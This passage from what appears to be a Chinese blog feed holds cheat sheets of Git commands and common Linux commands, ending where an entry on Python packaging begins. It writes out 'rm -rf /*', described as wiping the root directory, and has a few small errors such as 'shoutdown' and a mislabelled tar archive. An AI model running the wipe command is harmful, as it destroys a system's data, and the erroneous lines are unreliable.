[branch]<br><br><span class="hljs-comment"># 新建一个分支，指向指定commit</span><br>$ git branch [branch] [commit]<br><br><span class="hljs-comment"># 新建一个分支，与指定的远程分支建立追踪关系</span><br>$ git branch --track [branch] [remote-branch]<br><br><span class="hljs-comment"># 切换到指定分支，并更新工作区</span><br>$ git checkout [branch-name]<br><br><span class="hljs-comment"># 切换到上一个分支</span><br>$ git checkout -<br><br><span class="hljs-comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br>$ git branch --set-upstream [branch] [remote-branch]<br><br><span class="hljs-comment"># 合并指定分支到当前分支</span><br>$ git merge [branch]<br><br><span class="hljs-comment"># 选择一个commit，合并进当前分支</span><br>$ git cherry-pick [commit]<br><br><span class="hljs-comment"># 删除分支</span><br>$ git branch -d [branch-name]<br><br><span class="hljs-comment"># 删除远程分支</span><br>$ git push origin --delete [branch-name]<br>$ git branch -dr [remote/branch]<br></code></pre></div></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有tag</span><br>$ git tag<br><br><span class="hljs-comment"># 新建一个tag在当前commit</span><br>$ git tag [tag]<br><br><span class="hljs-comment"># 新建一个tag在指定commit</span><br>$ git tag [tag] [commit]<br><br><span class="hljs-comment"># 删除本地tag</span><br>$ git tag -d [tag]<br><br><span class="hljs-comment"># 删除远程tag</span><br>$ git push origin :refs/tags/[tagName]<br><br><span class="hljs-comment"># 查看tag信息</span><br>$ git show [tag]<br><br><span class="hljs-comment"># 提交指定tag</span><br>$ git push [remote] [tag]<br><br><span class="hljs-comment"># 提交所有tag</span><br>$ git push [remote] --tags<br><br><span class="hljs-comment"># 新建一个分支，指向某个tag</span><br>$ git checkout -b [branch] [tag]<br></code></pre></div></td></tr></table></figure><h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 显示有变更的文件</span><br>$ git status<br><br><span class="hljs-comment"># 显示当前分支的版本历史</span><br>$ git <span class="hljs-built_in">log</span><br><br><span class="hljs-comment"># 显示commit历史，以及每次commit发生变更的文件</span><br>$ git <span class="hljs-built_in">log</span> --<span class="hljs-built_in">stat</span><br><br><span class="hljs-comment"># 搜索提交历史，根据关键词</span><br>$ git <span class="hljs-built_in">log</span> -S [keyword]<br><br><span class="hljs-comment"># 显示某个commit之后的所有变动，每个commit占据一行</span><br>$ git <span class="hljs-built_in">log</span> [tag] HEAD --pretty=format:%s<br><br><span class="hljs-comment"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span><br>$ git <span class="hljs-built_in">log</span> [tag] HEAD --grep feature<br><br><span class="hljs-comment"># 显示某个文件的版本历史，包括文件改名</span><br>$ git <span class="hljs-built_in">log</span> --follow [file]<br>$ git whatchanged [file]<br><br><span class="hljs-comment"># 显示指定文件相关的每一次diff</span><br>$ git <span class="hljs-built_in">log</span> -p [file]<br><br><span class="hljs-comment"># 显示过去5次提交</span><br>$ git <span class="hljs-built_in">log</span> -5 --pretty --oneline<br><br><span class="hljs-comment"># 显示所有提交过的用户，按提交次数排序</span><br>$ git shortlog -sn<br><br><span class="hljs-comment"># 显示指定文件是什么人在什么时间修改过</span><br>$ git blame [file]<br><br><span class="hljs-comment"># 显示暂存区和工作区的差异</span><br>$ git diff<br><br><span class="hljs-comment"># 显示暂存区和上一个commit的差异</span><br>$ git diff --cached [file]<br><br><span class="hljs-comment"># 显示工作区与当前分支最新commit之间的差异</span><br>$ git diff HEAD<br><br><span class="hljs-comment"># 显示两次提交之间的差异</span><br>$ git diff [first-branch]...[second-branch]<br><br><span class="hljs-comment"># 显示今天你写了多少行代码</span><br>$ git diff --shortstat <span class="hljs-string">&quot;@&#123;0 day ago&#125;&quot;</span><br><br><span class="hljs-comment"># 显示某次提交的元数据和内容变化</span><br>$ git show [commit]<br><br><span class="hljs-comment"># 显示某次提交发生变化的文件</span><br>$ git show --name-only [commit]<br><br><span class="hljs-comment"># 显示某次提交时，某个文件的内容</span><br>$ git show [commit]:[filename]<br><br><span class="hljs-comment"># 显示当前分支的最近几次提交</span><br>$ git reflog<br></code></pre></div></td></tr></table></figure><h3 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 下载远程仓库的所有变动</span><br>$ git fetch [remote]<br><br><span class="hljs-comment"># 显示所有远程仓库</span><br>$ git remote -v<br><br><span class="hljs-comment"># 显示某个远程仓库的信息</span><br>$ git remote show [remote]<br><br><span class="hljs-comment"># 增加一个新的远程仓库，并命名</span><br>$ git remote add [shortname] [url]<br><br><span class="hljs-comment"># 取回远程仓库的变化，并与本地分支合并</span><br>$ git pull [remote] [branch]<br><br><span class="hljs-comment"># 上传本地指定分支到远程仓库</span><br>$ git push [remote] [branch]<br><br><span class="hljs-comment"># 强行推送当前分支到远程仓库，即使有冲突</span><br>$ git push [remote] --force<br><br><span class="hljs-comment"># 推送所有分支到远程仓库</span><br>$ git push [remote] --all<br></code></pre></div></td></tr></table></figure><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 恢复暂存区的指定文件到工作区</span><br>$ git checkout [file]<br><br><span class="hljs-comment"># 恢复某个commit的指定文件到暂存区和工作区</span><br>$ git checkout [commit] [file]<br><br><span class="hljs-comment"># 恢复暂存区的所有文件到工作区</span><br>$ git checkout .<br><br><span class="hljs-comment"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span><br>$ git reset [file]<br><br><span class="hljs-comment"># 重置暂存区与工作区，与上一次commit保持一致</span><br>$ git reset --hard<br><br><span class="hljs-comment"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span><br>$ git reset [commit]<br><br><span class="hljs-comment"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span><br>$ git reset --hard [commit]<br><br><span class="hljs-comment"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span><br>$ git reset --keep [commit]<br><br><span class="hljs-comment"># 新建一个commit，用来撤销指定commit</span><br><span class="hljs-comment"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span><br>$ git revert [commit]<br><br>暂时将未提交的变化移除，稍后再移入<br>$ git stash<br>$ git stash pop<br></code></pre></div></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 生成一个可供发布的压缩包</span><br>$ git archive<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>IDEA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-Linux常用命令</title>
    <link href="/2021/07/29/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/07/29/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1.基本命令"></a>1.基本命令</h2><h3 id="1-1-关机与重启"><a href="#1-1-关机与重启" class="headerlink" title="1.1 关机与重启"></a>1.1 关机与重启</h3><blockquote><ol><li>关机</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">shutdown -h -now &#x2F;&#x2F;立刻关机<br>shoutdown -h 5 &#x2F;&#x2F;5分钟后关机<br>poweroff &#x2F;&#x2F;立刻关机<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>重启</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">shutdown -r now &#x2F;&#x2F;立刻重启<br>shutdown -r 5 &#x2F;&#x2F;5分钟后重启<br>reboot &#x2F;&#x2F;立刻重启<br></code></pre></div></td></tr></table></figure><h3 id="1-2-帮助命令"><a href="#1-2-帮助命令" class="headerlink" title="1.2 帮助命令"></a>1.2 帮助命令</h3><blockquote><ol><li>help命令</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">shutdown --help<br>ifconfig --help<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>命令说明书，按键q退出</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">man shutdown <br>man ifconfig<br></code></pre></div></td></tr></table></figure><h2 id="2-目录操作命令"><a href="#2-目录操作命令" class="headerlink" title="2.目录操作命令"></a>2.目录操作命令</h2><h3 id="2-1-目录切换"><a href="#2-1-目录切换" class="headerlink" title="2.1 目录切换"></a>2.1 目录切换</h3><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">cd &#x2F;            &#x2F;&#x2F; 切换到根目录<br>cd &#x2F;usr         &#x2F;&#x2F; 切换到根目录下的usr目录 <br>cd ..&#x2F; 或者 cd ..   &#x2F;&#x2F; 切换到上一级目录 或者<br>cd ~&#x2F;&#x2F; 切换到home目录<br>cd - &#x2F;&#x2F; 切换到上次访问的目录<br></code></pre></div></td></tr></table></figure><h3 id="2-2-目录查看"><a href="#2-2-目录查看" class="headerlink" title="2.2 目录查看"></a>2.2 目录查看</h3><p>命令：ls [-al]</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">ls&#x2F;&#x2F; 查看当前目录下的所有目录和文件<br>ls -a&#x2F;&#x2F; 查看当前目录下的所有目录和文件（包括隐藏文件）<br>ls -l 或 ll &#x2F;&#x2F; 列表查看当前目录下的所有目录和文件（列表查看显示更多信息）<br>ls &#x2F;目录名       &#x2F;&#x2F; 查看指定目录下的所有目录和文件<br></code></pre></div></td></tr></table></figure><h3 id="2-3-目录操作（增、删、改、查）"><a href="#2-3-目录操作（增、删、改、查）" class="headerlink" title="2.3 目录操作（增、删、改、查）"></a>2.3 目录操作（增、删、改、查）</h3><blockquote><ol><li>增。创建目录（mkdir）</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">mkdir aaa     &#x2F;&#x2F; 在当前目录下创建一个名为 aaa 的目录<br>mkdir &#x2F;usr&#x2F;aaa    &#x2F;&#x2F; 在指定目录下创建一个名为 aaa 的目录<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>删。删除目录或文件（rm）</li></ol></blockquote><ul><li>删除文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">rm 文件&#x2F;&#x2F; 删除当前目录下的指定文件<br>rm -f 文件  &#x2F;&#x2F; 删除当前目录下的文件（不会提示）<br></code></pre></div></td></tr></table></figure><ul><li>删除目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">rm -r aaa         &#x2F;&#x2F; 递归删除当前目录下的 aaa 目录<br>rm -rf aaa        &#x2F;&#x2F; 递归删除当前目录下的 aaa 目录（不会提示）<br></code></pre></div></td></tr></table></figure><ul><li>全部删除</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">rm -rf *            &#x2F;&#x2F; 将当前目录下的所有目录和文件全部删除<br>rm -rf &#x2F;*           &#x2F;&#x2F; 将根目录下的所有文件全部删除（自杀命令）<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>改。目录修改（mv、cp）</li></ol></blockquote><ul><li>重命令目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">mv 当前目录 新目录<br>mv aaa bbb      &#x2F;&#x2F; 将目录 aaa 改为 bbb<br></code></pre></div></td></tr></table></figure><ul><li>剪切目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">mv 目录名称 目录新位置<br>mv &#x2F;usr&#x2F;tmp&#x2F;aaa &#x2F;usr   &#x2F;&#x2F;  将&#x2F;usr&#x2F;tmp目录下的aaa目录剪切到 &#x2F;usr目录下面<br></code></pre></div></td></tr></table></figure><ul><li>拷贝目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">cp -r 目录名称 目录拷贝的目标位置          &#x2F;&#x2F; -r代表递归<br>cp &#x2F;usr&#x2F;tmp&#x2F;aaa  &#x2F;usr           &#x2F;&#x2F;将&#x2F;usr&#x2F;tmp目录下的aaa目录复制到 &#x2F;usr目录下面<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>查。搜索目录</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">find 目录 参数 文件名称<br>find &#x2F;usr&#x2F;tmp -name &#39;a*&#39;        &#x2F;&#x2F; 查找&#x2F;usr&#x2F;tmp目录下的所有以a开头的目录或文件<br></code></pre></div></td></tr></table></figure><h2 id="3-文件操作命令"><a href="#3-文件操作命令" class="headerlink" title="3.文件操作命令"></a>3.文件操作命令</h2><h3 id="3-1-文件操作（增、删、改、查）"><a href="#3-1-文件操作（增、删、改、查）" class="headerlink" title="3.1 文件操作（增、删、改、查）"></a>3.1 文件操作（增、删、改、查）</h3><blockquote><ol><li>增。新建文件（touch）</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">touch 文件名<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>删。删除文件（rm）</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">rm -rf 文件名<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>改。修改文件（vi或vim）</li></ol></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">vi 或者 vim 文件名<br>点击键盘i&#x2F;a&#x2F;o进入编辑模式。<br>i:在光标所在字符前开始插入<br>a:在光标所在字符后开始插入<br>o:在光标所在行的下面另起一新行插入<br><br>按「ESC」键可回到命令行模式。<br><br>q：退出编辑<br>q!：强制退出<br>wq：保存并退出<br>wq!：强制保存并退出<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>查。文件查看（cat、more、less、tail）</li></ol></blockquote><ul><li>看最后一屏（cat）</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">cat sudo.conf    &#x2F;&#x2F; 使用cat查看&#x2F;etc&#x2F;sudo.conf文件，只能显示最后一屏内容<br></code></pre></div></td></tr></table></figure><ul><li>百分比显示</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">more sudo.conf   &#x2F;&#x2F; 使用more查看&#x2F;etc&#x2F;sudo.conf文件，可以显示百分比，回车可以向下一行，空格可以向下一页，q可以退出查看<br></code></pre></div></td></tr></table></figure><ul><li>翻页查看</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">less sudo.conf   &#x2F;&#x2F; 使用less查看&#x2F;etc&#x2F;sudo.conf文件，可以使用键盘上的PgUp和PgDn向上    和向下翻页，q结束查看<br></code></pre></div></td></tr></table></figure><ul><li>指定行数或者动态查看</li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">tail -10 sudo.conf   &#x2F;&#x2F; 使用tail -10 查看&#x2F;etc&#x2F;sudo.conf文件的后10行，Ctrl+C结束  <br></code></pre></div></td></tr></table></figure><h3 id="3-2-权限修改"><a href="#3-2-权限修改" class="headerlink" title="3.2 权限修改"></a>3.2 权限修改</h3><p>rwx：r代表可读，w代表可写，x代表该文件是一个可执行文件。<br>总共分为4段，如下：<br>_ _ _ _<br>- owner group other</p><p>文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。</p><p><img src="https://img-blog.csdnimg.cn/7e21e7b0044342c9bab336a4bc7557a4.jpg"></p><p>第一位：-就代表是文件，d代表是文件夹<br>第一段（3位二进制位）：代表拥有者的权限<br>第二段（3位二进制位）：代表拥有者所在的组，组员的权限<br>第三段（3位二进制位）：代表的是其他用户的权限</p><p>3位二进制位：000 分别对应 rwx 。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">chmod 777<br></code></pre></div></td></tr></table></figure><p>其中7的二进制为：111分别表示十进制的4 2 1。<br>第一个7表示 拥有者可读、可写、可执行文件。<br>第二个7表示 拥有者所在的组，其组员的权限为可读、可写、可执行文件。<br>第三个7表示 其他用户的权限为可读、可写、可执行文件。</p><table><thead><tr><th align="center">who</th><th align="center">用户类型</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>u</code></td><td align="center">user</td><td align="center">文件所有者</td></tr><tr><td align="center"><code>g</code></td><td align="center">group</td><td align="center">文件所有者所在组</td></tr><tr><td align="center"><code>o</code></td><td align="center">others</td><td align="center">所有其他用户</td></tr><tr><td align="center"><code>a</code></td><td align="center">all</td><td align="center">所用用户, 相当于 <em>ugo</em></td></tr></tbody></table><p>u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p><table><thead><tr><th align="center">Operator</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>+</code></td><td align="center">为指定的用户类型增加权限</td></tr><tr><td align="center"><code>-</code></td><td align="center">去除指定用户类型的权限</td></tr><tr><td align="center"><code>=</code></td><td align="center">设置指定用户权限的设置，即将用户类型的所有权限重新设置</td></tr></tbody></table><p>其他参数说明：</p><ul><li>-c : 若该文件权限确实已经更改，才显示其更改动作</li><li>-f : 若该文件权限无法被更改也不要显示错误讯息</li><li>-v : 显示权限变更的详细资料</li><li>-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递归的方式逐个变更)</li><li>–help : 显示辅助说明</li><li>–version : 显示版本</li></ul><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">chmod ugo+r file1.txt  &#x2F;&#x2F; 将文件 file1.txt 设为所有人皆可读取 <br>chmod a+r file1.txt  &#x2F;&#x2F; 将文件 file1.txt 设为所有人皆可读取 <br>chmod u+x ex1.py   &#x2F;&#x2F; 为 ex1.py 文件拥有者增加可执行权限<br>chmod -R a+r *    &#x2F;&#x2F; 将目前目录下的所有文件与子目录皆设为任何人可读取<br></code></pre></div></td></tr></table></figure><h2 id="4-压缩文件操作"><a href="#4-压缩文件操作" class="headerlink" title="4.压缩文件操作"></a>4.压缩文件操作</h2><h3 id="4-1-打包和压缩"><a href="#4-1-打包和压缩" class="headerlink" title="4.1 打包和压缩"></a>4.1 打包和压缩</h3><p>Linux中的打包文件后缀名：aa.tar<br>Linux中的压缩文件后缀名：aa.gz<br>Linux中的打包并压缩的文件后缀名：aa.tar.gz</p><p>命令：<code>tar -zcvf 打包压缩后的文件名 要打包的文件</code></p><ul><li><p>z：调用gzip压缩命令进行压缩</p></li><li><p>c：打包文件</p></li><li><p>v：显示运行过程</p></li><li><p>f：指定文件名</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">&#x2F;&#x2F; 打包并压缩&#x2F;usr&#x2F;tmp 下的所有文件 压缩后的压缩包指定名称为xxx.tar<br>tar -zcvf ab.tar aa.txt bb.txt <br>或者 <br>tar -zcvf ab.tar  *   &#x2F;&#x2F; 当前目录下的所有文件打包<br></code></pre></div></td></tr></table></figure><h3 id="4-2-解压"><a href="#4-2-解压" class="headerlink" title="4.2 解压"></a>4.2 解压</h3><p>命令：tar [-zxvf] 压缩文件<br>其中x代表解压。解压到当前目录下。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">tar -zxvf ab.tar<br></code></pre></div></td></tr></table></figure><blockquote><p>解压到指定位置。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">&#x2F;&#x2F; 将&#x2F;usr&#x2F;tmp 下的ab.tar解压到根目录&#x2F;usr下<br>tar -zxvf ab.tar -C &#x2F;usr      &#x2F;&#x2F; C代表指定解压的位置<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-Python项目打包</title>
    <link href="/2021/07/28/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-Python%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/"/>
    <url>/2021/07/28/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-Python%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85/</url>
    
